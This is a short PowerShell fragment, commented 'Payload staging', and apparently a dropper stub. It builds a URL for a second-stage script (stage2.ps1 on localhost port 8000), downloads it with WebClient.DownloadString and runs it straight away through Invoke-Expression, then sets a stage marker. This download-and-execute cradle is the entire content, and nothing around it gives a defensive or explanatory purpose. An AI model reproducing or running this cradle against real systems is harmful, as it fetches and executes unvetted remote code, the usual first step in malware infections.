<# Payload staging #> $FetchUrl = 'http://localhost:8000/stage2.ps1'; Invoke-Expression (New-Object System.Net.WebClient).DownloadString($FetchUrl); $StageMarker = "stage-43"
